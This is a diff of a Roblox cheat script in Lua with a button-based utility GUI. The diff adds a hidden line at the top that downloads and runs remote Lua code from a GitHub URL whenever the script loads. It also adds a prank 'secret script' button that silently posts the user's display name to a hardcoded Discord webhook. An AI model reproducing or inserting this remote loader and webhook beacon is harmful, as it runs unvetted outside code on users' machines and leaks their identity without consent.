@@ -1,10 +1,11 @@
 -- Services
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/UsedTheScript.lua"))()
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local StarterGui = game:GetService("StarterGui")
 local TeleportService = game:GetService("TeleportService")
---local ProximityPromptService = game:GetService("ProximityPromptService")
+local ProximityPromptService = game:GetService("ProximityPromptService")
 
 -- Variables
 local LocalPlayer = Players.LocalPlayer
@@ -444,7 +445,7 @@ UtilityTab:CreateButton({
     end,
 })
 
---[[ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt, player)
+ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt, player)
     if instantInteractEnabled then
         fireproximityprompt(prompt)
     end
@@ -459,7 +460,7 @@ UtilityTab:CreateToggle({
     end,
 })
 
-local function disablePrompts()
+--[[local function disablePrompts()
     for _, obj in ipairs(game:GetDescendants()) do
         if obj:IsA("ProximityPrompt") then
             obj.Enabled = false
@@ -735,6 +736,33 @@ GuiTab:CreateButton({
     Name = "⚠️SICRET SCREPT⚠️",
     Callback = function()
         local function Lol(Secret)
+            function SendMessage(url, message)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    if message:match("^%s*$") then
+        message = LocalPlayer.DisplayName .. " REST IN PEACE🕊️"
+    else
+        message = message .. "" .. LocalPlayer.DisplayName .. " REST IN PEACE🕊️"
+    end
+
+    local data = {
+        content = message
+    }
+    local body = http:JSONEncode(data)
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local url = "https://discord.com/api/webhooks/1381267617611776060/gAC_QyTuDsMMj4hht6FhRM3b5SCAOYfaJ-h-a_Xml937Fqx3cdMoDqos2MMyBpB0XVf5"
+SendMessage(url, "💀BRO CLICKED IT RIP💀")
+
             if Secret == "YUH UH" then
                 for i = 5, 1, -1 do
                     StarterGui:SetCore("SendNotification", {
